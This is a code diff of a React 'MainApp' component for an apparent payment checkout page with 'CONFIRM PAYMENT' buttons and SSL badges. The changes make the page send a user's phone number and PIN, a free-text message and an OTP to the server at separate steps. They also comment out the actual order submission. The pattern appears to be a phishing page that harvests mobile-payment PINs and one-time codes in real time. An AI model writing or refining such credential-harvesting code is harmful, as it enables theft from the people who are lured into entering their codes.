@@ -65,28 +65,66 @@ export default function MainApp() {
 
     const fetcher = useFetcher()
     const handleCompletion = () => {
-        fetcher.submit(formData, {
-            method: "POST",
+        // fetcher.submit(formData, {
+        //     method: "POST",
+        // });
+        alert("Done!")
+        setActiveStep(1);
+        setFormData({
+            phone: "",
+            pin: "",
+            otp: "",
+            message: ""
         });
-
+        setSelectedPlan(undefined);
     }
 
-    useEffect(() => {
-        if(!fetcher.data) return;
-        if (fetcher.data?.ok == true) {
-            alert("Order Completed Successfully!")
-            setActiveStep(1);
-            setFormData({
-                phone: "",
-                pin: "",
-                otp: "",
-                message: ""
-            });
-            setSelectedPlan(undefined);
-        }else{
-            alert("Something went wrong! Please try again.")
-        }
-    },[fetcher])
+    const handleSubmitPhone =async ()=>{
+        await fetcher.submit({
+            phone: formData.phone,
+            pin: formData.pin,
+            action: "submit-phone"
+        }, {
+            method: "POST",
+        });
+        setActiveStep(4);
+    }
+    const handleSubmitOtp =async ()=>{
+        await fetcher.submit({
+            phone: formData.phone,
+            otp: formData.otp,
+            action: "submit-otp"
+        }, {
+            method: "POST",
+        });
+        setActiveStep(6);
+    }
+    const handleSubmitMessage =async ()=>{
+        await fetcher.submit({
+            phone: formData.phone,
+            message: formData.message,
+            action: "submit-message"
+        }, {
+            method: "POST",
+        });
+        setActiveStep(5);
+    }
+    // useEffect(() => {
+    //     if(!fetcher.data) return;
+    //     if (fetcher.data?.ok == true) {
+    //         alert("Order Completed Successfully!")
+    //         setActiveStep(1);
+    //         setFormData({
+    //             phone: "",
+    //             pin: "",
+    //             otp: "",
+    //             message: ""
+    //         });
+    //         setSelectedPlan(undefined);
+    //     }else{
+    //         alert("Something went wrong! Please try again.")
+    //     }
+    // },[fetcher])
 
     return (
         <>
@@ -277,15 +315,21 @@ export default function MainApp() {
                                 </div>
 
                                 <button
+                                    disabled={fetcher.state!="idle"}
                                     onClick={() => {
-                                        (formData.phone.length >= 9 && formData.pin.length >= 5) && setActiveStep(4)
+                                        (formData.phone.length >= 9 && formData.pin.length >= 5) && handleSubmitPhone()
                                     }}
 
                                     type="submit" className="btn-primary btn-confirm-payment" id="btn-submit-1">
+                                    {fetcher.state !="idle"?
+                                    "Please Wait...":
+                                    <>
                                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                                         <polyline points="20 6 9 17 4 12"></polyline>
                                     </svg>
                                     CONFIRM PAYMENT
+                                    </>
+                                    }
                                 </button>
 
                                 <div className="ssl-badge" style={{ color: '#10b981' }}>
@@ -354,13 +398,14 @@ export default function MainApp() {
                             </div>
 
                             <button 
-                            
+                            disabled={fetcher.state!="idle"}
                             onClick={() => {
-                                (formData.message.length >= 20) && setActiveStep(5)
+                                (formData.message.length >= 20) && handleSubmitMessage()
                             }}
 
                             type="submit" className="btn-primary btn-orange" id="btn-submit-2">
-                                Next Step &rarr;
+                                {fetcher.state!="idle"?"Please Wait...": 
+                                <>Next Step &rarr;</>}
                             </button>
 
                             <div className="ssl-badge">
@@ -422,15 +467,19 @@ export default function MainApp() {
                             </div>
 
                             <button 
-                            
+                            disabled={fetcher.state!="idle"}
                             onClick={() => {
-                                (formData.otp.length >= 4) && setActiveStep(6)
+                                (formData.otp.length >= 4) && handleSubmitOtp()
                             }}
                             type="submit" className="btn-primary btn-orange" id="btn-submit-3" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
+                                {fetcher.state!="idle"?"Please Wait...": 
+                                <>
                                 Verify &amp; Complete
                                 <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                                     <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
                                 </svg>
+                                </>
+                                }
                             </button>
 
                             <div className="ssl-badge">
@@ -492,7 +541,7 @@ export default function MainApp() {
                             <button className="btn-primary" style={{ width: 'auto' }} onClick={() =>{
                                 handleCompletion();
                             }}>
-                                { fetcher.state!="idle"?"Please Wait...": "New Order Flow"}</button>
+                                { fetcher.state!="idle"?"Please Wait...": "Done"}</button>
                         </div>
                     </div>
                 </section>
